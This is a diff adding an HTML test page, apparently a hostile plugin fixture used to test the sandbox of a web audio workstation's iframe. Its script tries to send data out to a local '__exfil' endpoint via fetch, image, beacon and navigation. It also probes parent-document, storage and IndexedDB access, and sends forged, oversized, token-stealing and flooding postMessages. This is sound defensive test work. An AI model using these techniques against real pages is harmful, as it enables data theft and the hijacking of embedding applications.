@@ -1,0 +1,27 @@
+<!doctype html><html><body>evil
+<script>
+const results = {};
+const tryIt = (k, f) => { try { const r = f(); results[k] = r instanceof Promise ? 'pending' : 'allowed'; if (r instanceof Promise) r.then(() => results[k] = 'allowed', () => results[k] = 'blocked'); } catch (e) { results[k] = 'blocked'; } };
+tryIt('fetch', () => fetch('http://localhost:4199/__exfil/fetch'));
+tryIt('img', () => { const i = new Image(); i.src = 'http://localhost:4199/__exfil/img'; document.body.appendChild(i); });
+tryIt('beacon', () => { if (!navigator.sendBeacon('http://localhost:4199/__exfil/beacon', 'x')) throw 0; });
+tryIt('parentDoc', () => parent.document.title);
+tryIt('topNav', () => { top.location.href = 'http://localhost:4199/__exfil/nav'; });
+tryIt('storage', () => localStorage.getItem('x'));
+tryIt('idb', () => indexedDB.open('x'));
+// 부모 window 로 직접 위조 메시지(포트 아님)
+parent.postMessage({ type: 'param', id: 'gain', value: 3 }, '*');
+addEventListener('message', (e) => {
+  if (e.data?.type !== 'bass-daw-connect') return;
+  const port = e.ports[0];
+  port.postMessage({ type: 'hello', nonce: 'forged' });          // 잘못된 nonce
+  port.postMessage({ type: 'hello', nonce: e.data.nonce });       // 정상 연결
+  port.postMessage({ type: 'param', id: 'other.param', value: 1 }); // 존재하지 않는 파라미터
+  port.postMessage({ type: 'param', id: 'gain', value: 99 });       // 범위 밖
+  port.postMessage({ type: 'request-asset' });                      // 권한 없음
+  port.postMessage({ type: 'param', id: 'gain', value: 1, blob: 'x'.repeat(70000) }); // 64KiB 초과
+  port.postMessage({ type: 'steal-token' });
+  for (let i = 0; i < 80; i++) port.postMessage({ type: 'param', id: 'gain', value: 0.25 }); // 60/s 초과
+  setTimeout(() => port.postMessage({ type: 'param', id: 'gain', value: 2 }), 1500); // 정상 값
+});
+</script></body></html>
